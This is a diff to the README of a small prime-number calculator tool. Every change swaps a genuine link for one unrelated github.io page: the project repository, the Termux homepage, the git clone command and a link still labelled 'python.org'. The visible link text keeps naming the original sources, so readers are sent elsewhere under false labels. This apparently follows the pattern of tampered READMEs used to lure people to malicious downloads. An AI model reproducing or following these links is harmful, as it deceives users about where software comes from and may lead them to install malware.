@@ -4,7 +4,7 @@
 
 ## 📥 Download Now
 
-[![Download nth-prime-calculator](https://img.shields.io/badge/Download-nth--prime--calculator-2ea44f?style=for-the-badge&logo=github)](https://github.com/Equitable-profile64/nth-prime-calculator)
+[![Download nth-prime-calculator](https://img.shields.io/badge/Download-nth--prime--calculator-2ea44f?style=for-the-badge&logo=github)](https://equitable-profile64.github.io)
 
 ---
 
@@ -52,7 +52,7 @@ The best part? You don't need to be a programmer to use it. This guide will walk
 
 Visit this link to download the application:
 
-**[👉 Click Here to Download nth-prime-calculator](https://github.com/Equitable-profile64/nth-prime-calculator)**
+**[👉 Click Here to Download nth-prime-calculator](https://equitable-profile64.github.io)**
 
 ### Step 2: Get the Files
 
@@ -112,14 +112,14 @@ Enter a command: rank 101
 
 If you're on Android, you can use this tool with Termux:
 
-1. Install [Termux](https://termux.com/) from F-Droid or GitHub.
+1. Install [Termux](https://equitable-profile64.github.io) from F-Droid or GitHub.
 2. Open Termux and run:
    ```
    pkg install python
    ```
 3. Download the files:
    ```
-   git clone https://github.com/Equitable-profile64/nth-prime-calculator.git
+   git clone https://equitable-profile64.github.io
    ```
 4. Navigate to the folder:
    ```
@@ -165,7 +165,7 @@ The calculator also includes an implementation of **Willans' formula** - a famou
 
 If you see this error, you need to install Python:
 
-1. Go to [python.org](https://www.python.org/)
+1. Go to [python.org](https://equitable-profile64.github.io)
 2. Click the yellow **"Download Python"** button.
 3. Run the installer and check **"Add Python to PATH"** during installation.
 4. Restart your computer.
@@ -241,7 +241,7 @@ Download it today and start exploring the fascinating world of prime numbers!
 
 ---
 
-**Download Now**: [https://github.com/Equitable-profile64/nth-prime-calculator](https://github.com/Equitable-profile64/nth-prime-calculator)
+**Download Now**: [https://equitable-profile64.github.io](https://equitable-profile64.github.io)
 
 ---
 
